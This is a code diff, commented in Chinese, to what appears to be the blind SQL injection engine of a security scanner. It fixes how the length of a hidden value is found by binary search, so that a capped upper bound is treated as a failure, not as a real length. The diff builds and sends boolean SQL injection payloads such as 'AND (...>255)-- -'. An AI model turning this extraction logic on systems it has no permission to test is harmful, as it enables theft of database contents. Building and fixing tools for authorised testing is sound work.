@@ -395,6 +395,24 @@ async function _binarySearch(ex, ctx, base, makeCond, range = {}) {
       // 两端都假会导致骨架相同、备份判据自动禁用（实测：黑盒提取链因此仍超时）。
       shapeTrueAt: 0,
     });
+    // [B-FIX 2026-09-20] capped = 二分顶到上界 hi 且**备份判据也判不出方向**。
+    // 此时 r.n 只是「上界」而不是真实长度，照用会去逐字节提一个根本不存在的长值
+    // （历史事故：上界 65531，一个 5 字符的值要提 6.5 万字符）。
+    //
+    // ⚠️ 但**不能直接判失败** —— capped 有两种截然不同的成因，必须分层裁决：
+    //   ① 主段（hi=255 默认）：真实长度 ≥256 时二分**本来就该**顶到 255，这是合法信号，
+    //      下一步由 `_extendLength` 预检 `>255` 后在 [256, blindMaxLen] 续段求真实长度
+    //      （实测：300 字节长值走的就是这条路，直接判失败会把它整条打死）。
+    //   ② 延伸段（显式 range.hi=blindMaxLen）：已经没有更高的区间可去，
+    //      顶到上界 ⇒ 判据失效 ⇒ 真失败。
+    // 所以：主段只**打标记**交上层裁决；延伸段（有显式上界）直接判 -1。
+    if (r.capped) {
+      if (ctx) {
+        ctx.blindLenCapped = true;
+        ctx.blindLenCappedAt = range.hi ?? 255;
+      }
+      if (range.hi != null) return -1; // 延伸段：无更高区间可去 → 终审失败
+    }
     // 语义保持：返回「使条件成立的最大值 + 1」（全假 → 0）
     return r.n + 1;
   }
@@ -407,13 +425,29 @@ async function _extendLength(ex, ctx, base, lenExpr, current) {
     // [P1-FIX 2026-09-17] 默认上界 65535 → 4096：单字段超过 4K 字符属异常，
   // 拿 65531 去逐字节提取会把一次扫描拖成十几分钟（实测）。真需要更长时用 blindMaxLen 显式放大。
   const maxLen = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 4096;
-    if (current < 255 || maxLen <= 255) return current;
+    // 主段顶到 255（ctx.blindLenCapped）时，本函数是**唯一能裁决**的地方：
+    //   · 能延伸且预检为真 → 真实长度确实 >255，去 [256,maxLen] 求真实值；
+    //   · 不能延伸（blindMaxLen≤255 等）或预检为假 → 那个「255」不是量出来的长度，
+    //     是判据失效顶出来的上界 → 判失败（-1），不拿它去逐字节提取。
+    if (current < 255 || maxLen <= 255) return ctx?.blindLenCapped ? -1 : current;
     const judge = _dynJudge(ex, ctx);
     const probe255 = `${base} AND (${lenExpr}>255)-- -`;
     const [rTrue, rFalse] = await _sendBatch(ex, ctx, [probe255, `${base} AND (1=2)-- -`]);
     if (rFalse) judge.observe(rFalse?.data, probe255);
-    if (!judge.truthy(rTrue, rFalse?.data, probe255)) return current; // 真实长度恰为 255
+    if (!judge.truthy(rTrue, rFalse?.data, probe255)) {
+      return ctx?.blindLenCapped ? -1 : current; // 无 capped：真实长度恰为 255
+    }
     const ext = await _binarySearch(ex, ctx, base, (cmp) => `(${lenExpr})${cmp}`, { lo: 256, hi: maxLen });
+    // 延伸段顶到上界（ext === -1）同样有两种成因，探测层面无法区分：
+    //   ① 真实长度 ≥ maxLen —— 合法，按 maxLen 截断提取（既有测试：300 字节值 + blindMaxLen=280）；
+    //   ② 判据恒真失效 —— 顶到哪儿都真，maxLen 就是个假长度。
+    // 裁决依据：**这个 maxLen 是用户显式配的，还是默认的防御护栏**。
+    //   · 显式 `blindMaxLen>255` → 用户已授权「最多提这么长」→ 走截断语义（①，旧行为不变）；
+    //   · 撞上默认护栏（4096）→ 用户没授权过这么长 → 按 ② 判失败，不提 4096 个垃圾字节。
+    if (ext < 0) return Number(ctx?.config?.blindMaxLen) > 255 ? maxLen : -1;
+    // 走到这儿说明真实长度是在延伸段**量出来的**（不是顶出来的）→ 撤销主段的 capped 标记，
+    // 否则报告里会给一次成功的提取误记「长度探测失败」。
+    if (ctx) { ctx.blindLenCapped = false; ctx.blindLenCappedAt = undefined; }
     // 真实长度 ≥ maxLen 时二分会溢出返回 maxLen+1 → 钳位（提取前 maxLen 字节）
     return Math.min(ext, maxLen);
   }
